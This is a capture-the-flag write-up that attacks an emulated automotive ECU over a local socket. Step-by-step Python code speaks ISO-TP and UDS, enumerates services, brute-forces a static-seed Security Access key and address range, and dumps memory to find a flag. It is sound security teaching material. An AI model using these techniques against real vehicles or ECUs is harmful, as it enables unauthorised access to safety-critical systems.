
# CaptureTheFirmware - Write-up

The challenge goal is to extract the "firmware" from an emulated ECU exposed over TCP-IP socket.

# Challenge Set-up

```sh
$ cd server
$ python3 server.py
```
# Task
Connect to server on port 11231 and find the firmware version !!!
# Write-up
###  Step 1
First of all, the only input is the port number, so the first step is to mess around with the socket. 
#### Code
```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1', 11231))

print(sock.recv(10))
```
#### Output
```
> b'\x10GISO-TP'
```
Now, if you search the `GISO-TP` on google, you can find out that `ISO-TP` is an automotive protocol used as a "transport layer". This is a good hit to suspect this message to be an ISO-TP frame, especially that we are talking to an ECU. The Wiki page describe the protocol frames and flow. Most important: there are 4 frames type, the first nibble is the frame type and the `First Frame` should be acknowledged with a `Flow Control`.

By inspecing the output, we can see this is an 8 byte long message and the first byte is 0x10. The high nibble of `1` means this is a `First Frame` and we must send a `Flow Control` to receive the remaining part of the message.
The complete message size is encoded in the low nibble of the first byte and the second byte, that means the total size is `(msg[0] & 0x0F) * 0x100 + msg[1]`, which is `0x47`. 

We already received the first 6 bytes of the message, so we should read `0x41` more bytes. One `Consecutive Frame` can carry up to 7 bytes, so there are 10 fames left to read.

#### Code
```python
print(sock.recv(8))                 # Recv FirstFrame
sock.send(bytes([0x30] + [0] * 7))  # Send FlowControl 
for i in range(10):
	print(sock.recv(8))             # Recv ConsecutiveFrame
```
#### Output
```
> b'\x10GISO-TP'
> b'! fatal '
> b'"error. '
> b'#Disable'
> b'$ this m'
> b'%essage '
> b'&from IS'
> b"'O-14229"
> b'( config'
> b')uration'
> b'*! \x00\x00\x00\x00\x00'
```

If we remove the PCI bytes from the message `ISO-TP fatal error. Disable this message from ISO-14229 configuration!` which is leading to the second step.
###  Step 2
We have the message and an ISO standard, `Road vehicles — Unified diagnostic services (UDS)`. Some Google research will teach you that diagnostics messages are sent over `ISO-TP` and there are 2 types of messages: requests and responses.
Let's send some requests to ECU and see if we got an response. The `ping` request for an ECU is the `Tester Present` which is a 1 byte request: `0x3E`. This request must be put into a `Single Frame`, because the `ISO-TP` is the transport protocol: `0x11 0x3e` (Single Frame, size 1, data 0x3E)
#### Code
```python
sock.send(bytes([0x01, 0x3e] + [0x00] * 6))
print(' '.join("{:02x}".format(c) for c in sock.recv(8)))
````
#### Output
```
> 03 7f 3e 11 00 00 00 00
```
We got an response: `Single Frame` message with size 3: `7F 3e 11`.
The `7F` means a `Negative response` and the `11` is the `Negative response code`.
NRC `11` means `serviceNotSupported`. 

### Step 3
If this service is not suppoerted, let's find out which one is available. Valid service ID are `00-3F` and `80-BF`
#### Code
```python
for i in range(0x40):
	sock.send(bytes([0x01, i] + [0x00] * 6))
	if sock.recv(8)[:4] != bytes([0x03, 0x7F, i, 0x11]):
		print(hex(i))
```
#### Output
```
> 0x10 <- Diagnostic Session Control	
> 0x23 <- Read Memory By Address	
> 0x27 <- Security Access	
```
`Read Memory By Address` service is available, so let's use it to read the ECU's memory.
The format for this request is: `23 AS AA ... SS ...` where `L` is number of bytes used for `address` and `S` the number of bytes used for size. To read one byte from address 00 we should send `23 11 00 01`.
#### Code
```python
sock.send(bytes([0x04, 0x23, 0x11, 0x00, 0x01] + [0] * 3))
print(' '.join("{:02x}".format(c) for c in sock.recv(8)))
```
#### Output
```
> 03 7f 23 7f 00 00 00 00
```
The response is a negative one (`7F`) and the NRC is `serviceNotSupportedInActiveSession`, which means we need to change the session (service 0x10) before accessing this service.

### Setp 4
The `Diagnostic Session Control` request format is `10 SS` where `SS` is the session id. The programming session has an ID of 0x02 so let's try it out.
#### Code
```python
# Switch to Programming Session
sock.send(bytes([0x02, 0x10, 0x02] + [0] * 5))
print(' '.join("{:02x}".format(c) for c in sock.recv(8)))

# Read from memory
sock.send(bytes([0x04, 0x23, 0x11, 0x00, 0x01] + [0] * 3))
print(' '.join("{:02x}".format(c) for c in sock.recv(8)))
```
#### Output
```
> 02 50 02 00 00 00 00 00
> 03 7f 23 33 00 00 00 00
```

The first response is a positive response for switching to `Programming Session` but the second one is still negative, but this time `securityAccessDenied`, which means we need to "unlock" the service first by using `Security Access`.

### Step 5

To "unlock" the protected services, 2 requests should be made : request seed `27 01` and send key `27 02`.  Usually, an ECU is generating a 4 byte seed which is used to generate the authentication key.  

#### Code
```python
sock.send(bytes([0x02, 0x27, 0x01] + [0] * 5))
print(' '.join("{:02x}".format(c) for c in sock.recv(8)))
```
#### Output
```
> 06 67 01 53 5f a3 85 00
```
So we have a seed of `53 5f a3 85`. If you run this again, you can see that the seed is the same so the key will be also the same.  Due to the static seed, the key can be brute-forced.
#### Code
```python
key = 0
while(1):
	sock.send(bytes([0x02, 0x27, 0x01] + [0] * 5))
	
	key_bytes =  [key >> i & 0xff for i in (24,16,8,0)]
	sock.send(bytes([0x06, 0x27, 0x02] + key_bytes + [0] ))
	if(sock.recv(8)[1]==0x67):
		break;
	key += 1
print(' '.join("{:02x}".format(c) for c in key_bytes))
```
#### Output
```
> 00 00 00 85
```

### Step 6
The ECU is unlocked, let's read the memory again.

#### Code
```python
sock.send(bytes([0x02, 0x10, 0x02] + [0] * 5))
sock.recv(8)
sock.send(bytes([0x02, 0x27, 0x01] + [0] * 5))
sock.recv(8)
sock.send(bytes([0x06, 0x27, 0x02, 0x00, 0x00, 0x00, 0x85] + [0] * 1))
sock.recv(8)
sock.send(bytes([0x04, 0x23, 0x11, 0x00, 0x01] + [0] * 3))
print(' '.join("{:02x}".format(c) for c in sock.recv(8)))
```
#### Output
```
> 03 7f 23 31 00 00 00 00
```
The negative response has changed to `requestOutOfRange`. That means the read size is too large or the start address is invalid. The read size is 1, so the problem is the read address, another brute-force is needed to find out a valid value.
ECUs uses embedded processors and have a small amount of RAM and usually the addresses are 2 bytes long. So let's brute-force it, reading 1 byte and increasing the address value by 0x100 (most probable the RAM segment is aligned to 0x100 or 0x1000 ).
#### Code
```python
for i in range(0x100):
	sock.send(bytes([0x05, 0x23, 0x21, i, 0x00, 0x01] + [0] * 2))
	if(sock.recv(8)[1] == 0x63):
		print(hex(i * 0x100))
		break;
```
#### Output
```
> 0x1000
```
### Step 7

Now, we have the start address, let's read the memory: start at `0x1000` and read chunks of 6 bytes so the response is 6+ 1(positive response) = 7 bytes and fits into a `Single Frame` response.
#### Code
```python
mem = open("dump","wb")
addr = 0x1000
while(1):
	sock.send(bytes([0x05, 0x23, 0x21, addr//0x100, addr%0x100, 0x06] + [0] * 2))
	data = sock.recv(8)
	if data[1] != 0x63:
		break
	mem.write(data[2:])
	addr += 6
mem.close()
```
Using a HEX viewer, you can easily see that there's a BASE64 encoded string inside the memory dump which is the challenge's flag.
![alt text](https://raw.githubusercontent.com/dmgciubotaru/CaptureTheFirmware-Writeup/df16b2233eee53ef05bb1aa06ef29a195860773b/dump.png)

## References
[https://en.wikipedia.org/wiki/CAN_bus](https://en.wikipedia.org/wiki/CAN_bus)

[https://en.wikipedia.org/wiki/ISO_15765-2](https://en.wikipedia.org/wiki/ISO_15765-2)

[https://en.wikipedia.org/wiki/Unified_Diagnostic_Services](https://en.wikipedia.org/wiki/Unified_Diagnostic_Services)

[https://automotive.wiki/index.php/ISO_14229](https://automotive.wiki/index.php/ISO_14229)

[https://www.iso.org/standard/55283.html](https://www.iso.org/standard/55283.html)
